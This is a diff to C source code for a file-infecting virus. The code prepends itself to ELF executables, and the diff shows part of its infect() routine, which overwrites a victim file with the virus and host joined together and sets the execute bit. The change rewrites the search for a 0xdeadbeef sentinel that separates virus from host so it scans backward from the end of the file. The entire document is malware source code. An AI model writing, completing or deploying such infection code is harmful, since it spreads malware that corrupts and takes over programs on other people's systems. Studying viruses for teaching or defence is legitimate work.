@@ -1,7 +1,5 @@
-#include <errno.h>
 #include <fcntl.h>
 #include <stdint.h>
-#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <sys/stat.h>
@@ -26,20 +24,22 @@ static unsigned char *read_file(const char *name, size_t *size) {
     return data;
 }
 
-// Find 0xdeadbeef in the given data and return the offset of the sentinel. If not found, return size.
+// Find the final 0xdeadbeef sentinel between the virus and host.
 static size_t find_sentinel(const unsigned char *data, size_t size) {
-    for (size_t i = 0; i + sizeof(SENTINEL) <= size; i++) {
-        if (memcmp(data + i, SENTINEL, sizeof(SENTINEL)) == 0) {
-            size_t host_start = i + sizeof(SENTINEL);
+    if (size < sizeof(SENTINEL)) {
+        return size;
+    }
 
-            if (host_start + 4 <= size &&
-                data[host_start] == 0x7f &&
-                data[host_start + 1] == 'E' &&
-                data[host_start + 2] == 'L' &&
-                data[host_start + 3] == 'F') {
-                return i;
-            }
+    // Search from the end of the file toward the beginning
+    for (size_t i = size - sizeof(SENTINEL); i > 0; i--) {
+        if (memcmp(data + i, SENTINEL, sizeof(SENTINEL)) == 0) {
+            return i;
         }
+    }
+
+    // The loop above does not check offset zero, so handle it separately.
+    if (memcmp(data, SENTINEL, sizeof(SENTINEL)) == 0) {
+        return 0;
     }
 
     return size;
@@ -110,6 +110,7 @@ static void infect(const char *self_name, const char *victim_name) {
     write_file(victim_name, infected, infected_size, victim_status.st_mode & 0777);
     chmod(victim_name, (victim_status.st_mode & 0777) | S_IXUSR);
 
+    // Clean up
     free(infected);
     free(victim);
     free(self);
